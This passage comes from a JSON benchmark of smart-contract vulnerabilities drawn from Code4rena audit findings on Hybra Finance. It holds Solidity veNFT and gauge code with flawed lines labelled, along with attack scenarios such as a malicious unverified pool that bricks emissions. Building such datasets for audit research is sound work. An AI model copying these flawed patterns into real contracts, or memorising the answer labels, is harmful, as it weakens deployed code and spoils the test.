msg.sender,\r\n    //     //     uint(int256(locked[_tokenId1].amount)),\r\n    //     //     uint(int256(_splitAmount)),\r\n    //     //     newLocked.end,\r\n    //     //     block.timestamp\r\n    //     // );\r\n    // }\r\n\r\n    /// @notice Split a veNFT into multiple new veNFTs with specified weight distribution\r\n    /// @param _from The token ID to split\r\n    /// @param amounts Array of weights for distributing the locked amount\r\n    /// @return newTokenIds Array of newly created token IDs\r\n    function multiSplit(\r\n        uint _from,\r\n        uint[] memory amounts\r\n    ) external nonreentrant splitAllowed(_from) notPartnerNFT(_from) returns (uint256[] memory newTokenIds) {\r\n        require(amounts.length >= 2 && amounts.length <= 10, \"MIN2MAX10\");\r\n        \r\n        address owner = idToOwner[_from];\r\n\r\n        \r\n        IVotingEscrow.LockedBalance memory originalLocked = locked[_from];\r\n        require(originalLocked.end > block.timestamp || originalLocked.isPermanent, \"EXP\");\r\n        require(originalLocked.amount > 0, \"ZV\");\r\n        \r\n        // Calculate total weight\r\n        uint totalWeight = 0;\r\n        for(uint i = 0; i < amounts.length; i++) {\r\n            require(amounts[i] > 0, \"ZW\"); // Zero weight not allowed\r\n            totalWeight += amounts[i];\r\n        }\r\n        \r\n        // Burn the original NFT\r\n        locked[_from] = IVotingEscrow.LockedBalance(0, 0, false);\r\n        _checkpoint(_from, originalLocked, IVotingEscrow.LockedBalance(0, 0, false));\r\n        _burn(_from);\r\n        \r\n        // Create new NFTs with proportional amounts\r\n        newTokenIds = new uint256[](amounts.length);\r\n        uint[] memory actualAmounts = new uint[](amounts.length);\r\n        \r\n        for(uint i = 0; i < amounts.length; i++) {\r\n            IVotingEscrow.LockedBalance memory newLocked = IVotingEscrow.LockedBalance({\r\n                amount: int128(int256(uint256(int256(originalLocked.amount)) * amounts[i] / totalWeight)),\r\n                end: originalLocked.end,\r\n                isPermanent: originalLocked.isPermanent\r\n            });\r\n            \r\n            newTokenIds[i] = _createSplitNFT(owner, newLocked);\r\n            actualAmounts[i] = uint256(int256(newLocked.amount));\r\n        }\r\n        \r\n        emit MultiSplit(\r\n            _from,\r\n            newTokenIds,\r\n            msg.sender,\r\n            actualAmounts,\r\n            originalLocked.end,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function _createSplitNFT(address _to, IVotingEscrow.LockedBalance memory _newLocked) private returns (uint256 _tokenId) {\r\n        _tokenId = ++tokenId;\r\n        locked[_tokenId] = _newLocked;\r\n        _checkpoint(_tokenId, IVotingEscrow.LockedBalance(0, 0, false), _newLocked);\r\n        _mint(_to, _tokenId);\r\n    }\r\n\r\n    function toggleSplit(address _account, bool _bool) external {\r\n        require(msg.sender == team);\r\n        canSplit[_account] = _bool;\r\n    }\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                            DAO VOTING STORAGE\r\n    //////////////////////////////////////////////////////////////*/\r\n\r\n    /// @notice The EIP-712 typehash for the contract's domain\r\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\r\n\r\n    /// @notice The EIP-712 typehash for the delegation struct used by the contract\r\n    bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\r\n\r\n    /// @notice A record of each accounts delegate\r\n    mapping(address => address) private _delegates;\r\n\r\n    /// @notice A record of states for signing / validating signatures\r\n    mapping(address => uint) public nonces;\r\n\r\n    /**\r\n     * @notice Overrides the standard `Comp.sol` delegates mapping to return\r\n     * the delegator's own address if they haven't delegated.\r\n     * This avoids having to delegate to oneself.\r\n     */\r\n    function delegates(address delegator) public view returns (address) {\r\n        address current = _delegates[delegator];\r\n        return current == address(0) ? delegator : current;\r\n    }\r\n\r\n    /**\r\n     * @notice Gets the current votes balance for `account`\r\n     * @param account The address to get votes balance\r\n     * @return The number of current votes for `account`\r\n     */\r\n    function getVotes(address account) external view returns (uint) {\r\n        uint32 nCheckpoints = cpData.numCheckpoints[account];\r\n        if (nCheckpoints == 0) {\r\n            return 0;\r\n        }\r\n        uint[] storage _tokenIds = cpData.checkpoints[account][nCheckpoints - 1].tokenIds;\r\n        uint votes = 0;\r\n        for (uint i = 0; i < _tokenIds.length; i++) {\r\n            uint tId = _tokenIds[i];\r\n            votes = votes + VotingBalanceLogic.balanceOfNFT(tId, block.timestamp, votingBalanceLogicData);\r\n        }\r\n        return votes;\r\n    }\r\n\r\n    function getPastVotes(address account, uint timestamp)\r\n        public\r\n        view\r\n        returns (uint)\r\n    {\r\n        uint32 _checkIndex = VotingDelegationLib.getPastVotesIndex(cpData, account, timestamp);\r\n        // Sum votes\r\n        uint[] storage _tokenIds = cpData.checkpoints[account][_checkIndex].tokenIds;\r\n        uint votes = 0;\r\n        for (uint i = 0; i < _tokenIds.length; i++) {\r\n            uint tId = _tokenIds[i];\r\n            // Use the provided input timestamp here to get the right decay\r\n            votes = votes + VotingBalanceLogic.balanceOfNFT(tId, timestamp,  votingBalanceLogicData);\r\n        }\r\n\r\n        return votes;\r\n    }\r\n\r\n\r\n    function getPastTotalSupply(uint256 timestamp) external view returns (uint) {\r\n        return totalSupplyAtT(timestamp);\r\n    }\r\n\r\n\r\n    /*///////////////////////////////////////////////////////////////\r\n                             DAO VOTING LOGIC\r\n    //////////////////////////////////////////////////////////////*/\r\n    function _delegate(address delegator, address delegatee) internal {\r\n        /// @notice differs from `_delegate()` in `Comp.sol` to use `delegates` override method to simulate auto-delegation\r\n        address currentDelegate = delegates(delegator);\r\n\r\n        _delegates[delegator] = delegatee;\r\n\r\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\r\n        VotingDelegationLib.TokenHelpers memory tokenHelpers = VotingDelegationLib.TokenHelpers({\r\n            ownerOfFn: ownerOf,\r\n            ownerToNFTokenCountFn: ownerToNFTokenCountFn,\r\n            tokenOfOwnerByIndex:tokenOfOwnerByIndex\r\n        });\r\n        VotingDelegationLib._moveAllDelegates(cpData, delegator, currentDelegate, delegatee, tokenHelpers);\r\n    }\r\n\r\n    /**\r\n     * @notice Delegate votes from `msg.sender` to `delegatee`\r\n     * @param delegatee The address to delegate votes to\r\n     */\r\n    function delegate(address delegatee) public {\r\n        if (delegatee == address(0)) delegatee = msg.sender;\r\n        return _delegate(msg.sender, delegatee);\r\n    }\r\n\r\n    function delegateBySig(\r\n        address delegatee,\r\n        uint nonce,\r\n        uint expiry,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) public {\r\n        require(delegatee != msg.sender, \"NA\");\r\n        require(delegatee != address(0), \"ZA\");\r\n        \r\n        bytes32 domainSeparator = keccak256(\r\n            abi.encode(\r\n                DOMAIN_TYPEHASH,\r\n                keccak256(bytes(name)),\r\n                keccak256(bytes(version)),\r\n                block.chainid,\r\n                address(this)\r\n            )\r\n        );\r\n        bytes32 structHash = keccak256(\r\n            abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry)\r\n        );\r\n        bytes32 digest = keccak256(\r\n            abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\r\n        );\r\n        address signatory = ecrecover(digest, v, r, s);\r\n        require(\r\n            signatory != address(0),\r\n            \"ZA\"\r\n        );\r\n        require(\r\n            nonce == nonces[signatory]++,\r\n            \"!NONCE\"\r\n        );\r\n        require(\r\n            block.timestamp <= expiry,\r\n            \"EXP\"\r\n        );\r\n        return _delegate(signatory, delegatee);\r\n    }\r\n\r\n\r\n\r\n}",
            "vulnerable_lines": [
                760
            ],
            "vulnerable_functions": [
                "_checkpoint"
            ]
        },
        "context_files": [],
        "call_flow": "create_lock(amount1) -> increase_amount(amount2) [same tx] -> _checkpoint() duplicate timestamp -> balanceOfNFT ignores increase",
        "context_hint": "Same-tx lock increase creates duplicate checkpoint timestamp, undercalculating voting power.",
        "is_vulnerable": true
    },
    {
        "id": "gs_c4_2025-10-hybra-finance_M09",
        "subset": "gold_standard",
        "language": "solidity",
        "chain": "ethereum",
        "source_platform": "code4rena",
        "source_report": "2025-10-hybra-finance",
        "source_finding_id": "M-09",
        "report_url": "https://code4rena.com/reports/2025-10-hybra-finance",
        "github_repo_url": "https://github.com/code-423n4/2025-10-hybra-finance",
        "contest_date": "2025-10-06",
        "severity": "medium",
        "vulnerability_type": "access_control",
        "difficulty_tier": 3,
        "context_level": "multi_file",
        "finding_title": "CL gauge accepts unverified pools, allowing malicious pool to brick distribution",
        "finding_description": "`GaugeManager._createGauge()` for CL pools (`_gaugeType == 1`) skips factory verification, allowing malicious pools to revert in `updateRewardsGrowthGlobal()`, bricking emissions.",
        "attack_scenario": "A test creates a malicious pool that reverts, votes for it, and `distributeAll()` reverts.",
        "fix_description": "Require `_pool` to be from the trusted CL factory; restrict gauge creation to governance. Status: Unmitigated.",
        "primary_file": {
            "path": "cl/contracts/GaugeManager.sol",
            "content": "// Full file content could not be retrieved from GitHub raw (access issue); using vulnerable code snippet from report: [L165-189, 185-189, 197-201] - _createGauge skips verification for type 1.",
            "vulnerable_lines": [
                165,
                166,
                167,
                168,
                169,
                170,
                171,
                172,
                173,
                174,
                175,
                176,
                177,
                178,
                179,
                180,
                181,
                182,
                183,
                184,
                185,
                186,
                187,
                188,
                189,
                197,
                198,
                199,
                200,
                201
            ],
            "vulnerable_functions": [
                "_createGauge",
                "createGauge"
            ]
        },
        "context_files": [
            {
                "path": "cl/contracts/GaugeCL.sol",
                "content": "pragma solidity 0.8.13;\r\n\r\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\r\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\r\nimport \"@openzeppelin/contracts/utils/structs/EnumerableSet.sol\";\r\nimport \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\r\n import \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\r\nimport '../interfaces/IGaugeFactoryCL.sol';\r\nimport '../interfaces/IGaugeManager.sol';\r\nimport './interface/ICLPool.sol';\r\nimport './interface/ICLFactory.sol';\r\nimport './interface/INonfungiblePositionManager.sol';\r\nimport '../interfaces/IBribe.sol';\r\nimport '../interfaces/IRHYBR.sol';\r\nimport {HybraTimeLibrary} from \"../libraries/HybraTimeLibrary.sol\";\r\nimport {FullMath} from \"./libraries/FullMath.sol\";\r\nimport {FixedPoint128} from \"./libraries/FixedPoint128.sol\";\r\nimport '../interfaces/IRHYBR.sol';\r\n\r\n\r\n\r\ncontract GaugeCL is ReentrancyGuard, Ownable, IERC721Receiver {\r\n\r\n    using SafeERC20 for IERC20;\r\n    using EnumerableSet for EnumerableSet.UintSet;\r\n    using SafeCast for uint128;\r\n    IERC20 public immutable rewardToken;\r\n    address public immutable rHYBR;\r\n    address public VE;\r\n    address public DISTRIBUTION;\r\n    address public internal_bribe;\r\n    address public external_bribe;\r\n\r\n    uint256 public DURATION;\r\n    uint256 internal _periodFinish;\r\n    uint256 public rewardRate;\r\n    ICLPool public clPool;\r\n    address public poolAddress;\r\n    INonfungiblePositionManager public nonfungiblePositionManager;\r\n    \r\n    bool public emergency;\r\n    bool public immutable isForPair;\r\n    address immutable factory;\r\n\r\n    mapping(uint256 => uint256) public  rewardRateByEpoch; // epoch => reward rate\r\n    mapping(address => EnumerableSet.UintSet) internal _stakes;\r\n    mapping(uint256 => uint256) public  rewardGrowthInside;\r\n\r\n    mapping(uint256 => uint256) public  rewards;\r\n\r\n    mapping(uint256 => uint256) public  lastUpdateTime;\r\n\r\n    event RewardAdded(uint256 reward);\r\n    event Deposit(address indexed user, uint256 amount);\r\n    event Withdraw(address indexed user, uint256 amount);\r\n    event Harvest(address indexed user, uint256 reward);\r\n    event ClaimFees(address indexed from, uint256 claimed0, uint256 claimed1);\r\n    event EmergencyActivated(address indexed gauge, uint256 timestamp);\r\n    event EmergencyDeactivated(address indexed gauge, uint256 timestamp);\r\n\r\n    constructor(address _rewardToken, address _rHYBR, address _ve, address _pool, address _distribution, address _internal_bribe, \r\n        address _external_bribe, bool _isForPair, address nfpm,  address _factory) {\r\n        factory = _factory;\r\n        rewardToken = IERC20(_rewardToken);     // main reward\r\n        rHYBR = _rHYBR;\r\n        VE = _ve;                               // vested\r\n        poolAddress = _pool;\r\n        clPool = ICLPool(_pool);\r\n        DISTRIBUTION = _distribution;           // distro address (GaugeManager)\r\n        DURATION = HybraTimeLibrary.WEEK;                   \r\n\r\n        internal_bribe = _internal_bribe;       // lp fees goes here\r\n        external_bribe = _external_bribe;       // bribe fees goes here\r\n        isForPair = _isForPair;\r\n        nonfungiblePositionManager = INonfungiblePositionManager(nfpm);\r\n        emergency = false;\r\n    }\r\n\r\n    modifier onlyDistribution() {\r\n        require(msg.sender == DISTRIBUTION, \"Caller is not RewardsDistribution contract\");\r\n        _;\r\n    }\r\n\r\n    modifier isNotEmergency() {\r\n        require(emergency == false, \"emergency\");\r\n        _;\r\n    }\r\n\r\n\r\n    function _updateRewards(uint256 tokenId, int24 tickLower, int24 tickUpper) internal {\r\n        if (lastUpdateTime[tokenId] == block.timestamp) return;\r\n        clPool.updateRewardsGrowthGlobal();\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n        rewards[tokenId] += _earned(tokenId);\r\n        rewardGrowthInside[tokenId] = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n    }\r\n\r\n    function activateEmergencyMode() external onlyOwner {\r\n        require(emergency == false, \"emergency\");\r\n        emergency = true;\r\n        emit EmergencyActivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function stopEmergencyMode() external onlyOwner {\r\n\r\n        require(emergency == true,\"emergency\");\r\n\r\n        emergency = false;\r\n        emit EmergencyDeactivated(address(this), block.timestamp);\r\n    }\r\n\r\n    function balanceOf(uint256 tokenId) external view returns (uint256) {\r\n        (,,,,,,,uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        return liquidity;\r\n    }\r\n\r\n    function _getPoolAddress(address token0, address token1, int24 tickSpacing) internal view returns (address) {\r\n        return ICLFactory(nonfungiblePositionManager.factory()).getPool(token0, token1, tickSpacing);\r\n    }\r\n\r\n    function earned(uint256 tokenId) external view returns (uint256 reward) {\r\n        require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        uint256 reward = _earned(tokenId);\r\n        return (reward); // bonsReward is 0 for now\r\n    }\r\n\r\n       function _earned(uint256 tokenId) internal view returns (uint256) {\r\n        uint256 lastUpdated = clPool.lastUpdated();\r\n\r\n        uint256 timeDelta = block.timestamp - lastUpdated;\r\n\r\n        \r\n        uint256 rewardGrowthGlobalX128 = clPool.rewardGrowthGlobalX128();\r\n        uint256 rewardReserve = clPool.rewardReserve();\r\n\r\n        if (timeDelta != 0 && rewardReserve > 0 && clPool.stakedLiquidity() > 0) {\r\n            uint256 reward = rewardRate * timeDelta;\r\n            if (reward > rewardReserve) reward = rewardReserve;\r\n\r\n            rewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, clPool.stakedLiquidity());\r\n        }\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n\r\n        uint256 rewardPerTokenInsideInitialX128 = rewardGrowthInside[tokenId];\r\n        uint256 rewardPerTokenInsideX128 = clPool.getRewardGrowthInside(tickLower, tickUpper, rewardGrowthGlobalX128);\r\n\r\n        uint256 claimable =\r\n            FullMath.mulDiv(rewardPerTokenInsideX128 - rewardPerTokenInsideInitialX128, liquidity, FixedPoint128.Q128);\r\n        return claimable;\r\n    }\r\n\r\n    function deposit(uint256 tokenId) external nonReentrant isNotEmergency {\r\n        \r\n         (,,address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity,,,,) = \r\n            nonfungiblePositionManager.positions(tokenId);\r\n        \r\n        require(liquidity > 0, \"Gauge: zero liquidity\");\r\n        // Calculate pool address from position parameters\r\n        address positionPool = _getPoolAddress(token0, token1, tickSpacing);\r\n        // Verify that the position's pool matches this gauge's pool\r\n        require(positionPool == poolAddress, \"Pool mismatch: Position not for this gauge pool\");\r\n        // collect fees \r\n        nonfungiblePositionManager.collect(INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            }));\r\n\r\n        nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId);\r\n\r\n        clPool.stake(int128(liquidity), tickLower, tickUpper, true);\r\n\r\n\r\n        uint256 rewardGrowth = clPool.getRewardGrowthInside(tickLower, tickUpper, 0);\r\n        rewardGrowthInside[tokenId] = rewardGrowth;\r\n        lastUpdateTime[tokenId] = block.timestamp;\r\n\r\n        _stakes[msg.sender].add(tokenId);\r\n\r\n        emit Deposit(msg.sender, tokenId);\r\n    }\r\n\r\n    function withdraw(uint256 tokenId, uint8 redeemType) external nonReentrant isNotEmergency {\r\n           require(_stakes[msg.sender].contains(tokenId), \"NA\");\r\n\r\n        // trigger update on staked position so NFT will be in sync with the pool\r\n        nonfungiblePositionManager.collect(\r\n            INonfungiblePositionManager.CollectParams({\r\n                tokenId: tokenId,\r\n                recipient: msg.sender,\r\n                amount0Max: type(uint128).max,\r\n                amount1Max: type(uint128).max\r\n            })\r\n        );\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper, uint128 liquidityToStake,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, msg.sender, redeemType);\r\n\r\n        // update virtual liquidity in pool only if token has existing liquidity\r\n        // i.e. not all removed already via decreaseStakedLiquidity\r\n        if (liquidityToStake != 0) {\r\n            clPool.stake(-int128(liquidityToStake), tickLower, tickUpper, true);\r\n        }\r\n\r\n        _stakes[msg.sender].remove(tokenId);\r\n        nonfungiblePositionManager.safeTransferFrom(address(this), msg.sender, tokenId);\r\n\r\n        emit Withdraw(msg.sender, tokenId);\r\n    }\r\n\r\n    \r\n\r\n    function getReward(uint256 tokenId, address account,uint8 redeemType ) public nonReentrant onlyDistribution {\r\n\r\n        require(_stakes[account].contains(tokenId), \"NA\");\r\n\r\n        (,,,,, int24 tickLower, int24 tickUpper,,,,,) = nonfungiblePositionManager.positions(tokenId);\r\n        _getReward(tickLower, tickUpper, tokenId, account, redeemType);\r\n    }\r\n\r\n\r\n    function _getReward(int24 tickLower, int24 tickUpper, uint256 tokenId,address account, uint8 redeemType) internal {\r\n        _updateRewards(tokenId, tickLower, tickUpper);\r\n        uint256 rewardAmount = rewards[tokenId];\r\n        if(rewardAmount > 0){\r\n            delete rewards[tokenId];\r\n            rewardToken.safeApprove(rHYBR, rewardAmount);\r\n            IRHYBR(rHYBR).depostionEmissionsToken(rewardAmount);\r\n            IRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account);\r\n        }\r\n        emit Harvest(msg.sender, rewardAmount);\r\n    }\r\n\r\n    function notifyRewardAmount(address token, uint256 rewardAmount) external nonReentrant\r\n        isNotEmergency onlyDistribution returns (uint256 currentRate) {\r\n        require(token == address(rewardToken), \"Invalid reward token\");\r\n\r\n        // Update global reward growth before processing new rewards\r\n        clPool.updateRewardsGrowthGlobal();\r\n\r\n        // Calculate time remaining until next epoch begins\r\n        uint256 epochTimeRemaining = HybraTimeLibrary.epochNext(block.timestamp) - block.timestamp;\r\n        uint256 epochEndTimestamp = block.timestamp + epochTimeRemaining;\r\n\r\n        // Include any rolled over rewards from previous period\r\n        uint256 totalRewardAmount = rewardAmount + clPool.rollover();\r\n\r\n        // Check if we are starting a new reward period or continuing existing one\r\n        if (block.timestamp >= _periodFinish) {\r\n            // New period: distribute rewards over remaining epoch time\r\n            rewardRate = rewardAmount / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        } else {\r\n            // Existing period: add new rewards to pending distribution\r\n            uint256 pendingRewards = epochTimeRemaining * rewardRate;\r\n            rewardRate = (rewardAmount + pendingRewards) / epochTimeRemaining;\r\n            clPool.syncReward({\r\n                rewardRate: rewardRate,\r\n                rewardReserve: totalRewardAmount + pendingRewards,\r\n                periodFinish: epochEndTimestamp\r\n            });\r\n        }\r\n\r\n        // Store reward rate for current epoch tracking\r\n        rewardRateByEpoch[HybraTimeLibrary.epochStart(block.timestamp)] = rewardRate;\r\n\r\n        // Transfer reward tokens from distributor to gauge\r\n        rewardToken.safeTransferFrom(DISTRIBUTION, address(this), rewardAmount);\r\n\r\n        // Verify contract has sufficient balance to support calculated reward rate\r\n        uint256 contractBalance = rewardToken.balanceOf(address(this));\r\n        require(rewardRate <= contractBalance / epochTimeRemaining, \"Insufficient balance for reward rate\");\r\n\r\n        // Update period finish time and return current rate\r\n        _periodFinish = epochEndTimestamp;\r\n        currentRate = rewardRate;\r\n\r\n        emit RewardAdded(rewardAmount);\r\n    }\r\n\r\n    function gaugeBalances() external view returns (uint256 token0, uint256 token1){\r\n        \r\n        (token0, token1) = clPool.gaugeFees();\r\n\r\n    }\r\n\r\n  \r\n\r\n\r\n\r\n    function claimFees() external nonReentrant returns (uint256 claimed0, uint256 claimed1) {\r\n        return _claimFees();\r\n    }\r\n\r\n    function _claimFees() internal returns (uint256 claimed0, uint256 claimed1) {\r\n        if (!isForPair) {\r\n            return (0, 0);\r\n        }\r\n        \r\n        clPool.collectFees();\r\n        \r\n        address _token0 = clPool.token0();\r\n        address _token1 = clPool.token1();\r\n        // Fetch fee from the whole epoch which just eneded and transfer it to internal Bribe address.\r\n        claimed0 = IERC20(_token0).balanceOf(address(this));\r\n        claimed1 = IERC20(_token1).balanceOf(address(this));\r\n\r\n        if (claimed0 > 0 || claimed1 > 0) {\r\n    \r\n\r\n            uint256 _fees0 = claimed0;\r\n            uint256 _fees1 = claimed1;\r\n\r\n            if (_fees0  > 0) {\r\n                IERC20(_token0).safeApprove(internal_bribe, 0);\r\n                IERC20(_token0).safeApprove(internal_bribe, _fees0);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token0, _fees0);\r\n            } \r\n            if (_fees1  > 0) {\r\n                IERC20(_token1).safeApprove(internal_bribe, 0);\r\n                IERC20(_token1).safeApprove(internal_bribe, _fees1);\r\n                IBribe(internal_bribe).notifyRewardAmount(_token1, _fees1);\r\n            } \r\n            emit ClaimFees(msg.sender, claimed0, claimed1);\r\n        }\r\n    }\r\n\r\n    ///@notice get total reward for the duration\r\n    function rewardForDuration() external view returns (uint256) {\r\n        return rewardRate * DURATION;\r\n    }\r\n\r\n    ///@notice set new internal bribe contract (where to send fees)\r\n    function setInternalBribe(address _int) external onlyOwner {\r\n        require(_int >= address(0), \"zero\");\r\n        internal_bribe = _int;\r\n    }\r\n\r\n    function _safeTransfer(address token,address to,uint256 value) internal {\r\n        require(token.code.length > 0);\r\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));\r\n        require(success && (data.length == 0 || abi.decode(data, (bool))));\r\n    }\r\n\r\n    /**\r\n     * @dev Handle the receipt of an NFT\r\n     * @param operator The address which called `safeTransferFrom` function\r\n     * @param from The address which previously owned the token\r\n     * @param tokenId The NFT identifier which is being transferred\r\n     * @param data Additional data with no specified format\r\n     * @return bytes4 `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\r\n     */\r\n    function onERC721Received(\r\n        address operator,\r\n        address from,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external pure override returns (bytes4) {\r\n        return IERC721Receiver.onERC721Received.selector;\r\n    }\r\n\r\n}\r\n\r\n",
                "relevance": "GaugeCL's reward update reverts on unverified pools, bricking emissions."
            }
        ],
        "call_flow": "createGauge(malicious pool, type=1) -> vote for gauge -> distributeAll() -> updateRewardsGrowthGlobal() revert",
        "context_hint": "Unverified CL pools can be created and voted for, causing reverts in reward distribution.",
        "is_vulnerable": true
    }
]